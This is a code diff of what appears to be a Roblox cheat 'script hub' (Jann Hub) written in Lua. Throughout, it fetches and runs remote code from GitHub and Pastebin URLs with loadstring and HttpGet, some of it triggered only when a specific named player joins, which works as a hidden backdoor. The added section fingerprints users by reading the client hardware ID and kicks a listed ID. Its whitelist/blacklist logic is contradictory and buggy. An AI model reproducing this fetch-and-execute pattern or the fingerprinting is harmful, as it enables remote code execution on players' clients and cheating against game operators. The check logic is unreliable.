@@ -6,10 +6,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/ma
 wait()
 
 game.Players.PlayerAdded:Connect(function(Player)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/venncord/JannHub/main/chattags.lua"))()
-end)
-
-game.Players.PlayerAdded:Connect(function(Player)
 	if Player.Name == "ProAIt5000" then
 		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
 	end
@@ -20,6 +16,28 @@ game.Players.PlayerAdded:Connect(function(Player)
 		loadstring(game:HttpGet("https://pastebin.com/raw/7V3d4vw4"))()
 	end
 end)
+
+
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
+local WhitelistedHWIDs = {"80e56303-ea6e-4aac-91f5-86f50f0b574e"}
+local qNVAKkuwxNpqruLjSRHg = false
+
+function CheckHWID(hwidval)
+for _,whitelisted in pairs(WhitelistedHWIDs) do
+ if hwidval == whitelisted then
+     return true
+ elseif hwidval ~= whitelisted then
+     return false
+       end
+    end
+end
+
+qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
+
+if qNVAKkuwxNpqruLjSRHg == true then
+ game.Players.LocalPlayer:Kick("You have been blacklisted from using Jann Hub.")
+end
+
 
 
 local url =
